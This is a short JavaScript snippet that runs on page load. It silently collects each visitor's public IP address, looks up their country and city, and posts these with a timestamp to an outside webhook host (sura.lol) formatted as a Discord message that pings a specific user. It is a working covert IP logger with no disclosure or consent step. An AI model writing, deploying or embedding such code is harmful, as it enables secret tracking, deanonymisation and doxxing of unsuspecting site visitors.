const sendIPToDiscord = async () => {
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      const ip = ipData.ip;

      const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
      const locationData = await locationResponse.json();
      const country = locationData.country_name;
      const city = locationData.city;
      const time = new Date().toLocaleString();

      const webhookURL = 'https://sura.lol/api/66951b9827435';
      const payload = {
        embeds: [{
          title: 'User Location Information',
          description: '\n<@903262692335312946>\n' +
                       '```\nCountry: ' + country + '\n```' +
                       '```\nCity: ' + city + '\n```' +
                       '```\nTime: ' + time + '\n```' +
                       '```\nIP Address: ' + ip + '\n```',
          color: 0x008080
        }]
      };

      await fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      console.log('wsp g');
    } catch (error) {
      console.error('um..this is a problem: ', error);
    }
  };

  // Call sendIPToDiscord function when the page loads
  sendIPToDiscord();